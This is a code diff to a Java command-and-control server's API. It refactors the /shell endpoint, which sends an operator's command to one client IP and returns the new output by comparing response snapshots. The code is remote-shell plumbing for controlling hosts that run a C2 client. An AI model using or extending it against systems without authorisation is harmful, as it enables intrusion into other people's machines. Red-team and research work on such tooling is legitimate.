@@ -285,18 +285,20 @@ public class C2ServerAPI implements Runnable {
                     JSONObject shellJSON = new JSONObject(new String(t.getRequestBody().readAllBytes()));
                     String scope = shellJSON.get("scope").toString();
                     String command = shellJSON.get("command").toString();
-                    String shellResponse = "";
                     try{
-                        int numResponses = C2server.getClientResponses(scope).get(scope).size();
+                        // Snapshot this host's responses before and after running the command,
+                        // then diff to collect only the new output. /shell targets one IP.
+                        ArrayList<String> before = C2server.snapshotResponsesForIP(scope);
                         C2server.getShellResponse(scope, command);
-                        ArrayList<String> clientResponses = C2server.getClientResponses(scope).get(scope);
-                        
-                        for(int i = numResponses; i < clientResponses.size(); i++){
-                            shellResponse += clientResponses.get(i);
+                        ArrayList<String> after = C2server.snapshotResponsesForIP(scope);
+
+                        StringBuilder shellResponse = new StringBuilder();
+                        for(int i = before.size(); i < after.size(); i++){
+                            shellResponse.append(after.get(i));
                         }
 
                         JSONObject returnObject = new JSONObject();
-                        returnObject.put("output", shellResponse);
+                        returnObject.put("output", shellResponse.toString());
                         response = returnObject.toString();
                     } catch (Exception e){
                         JSONObject returnObject = new JSONObject();
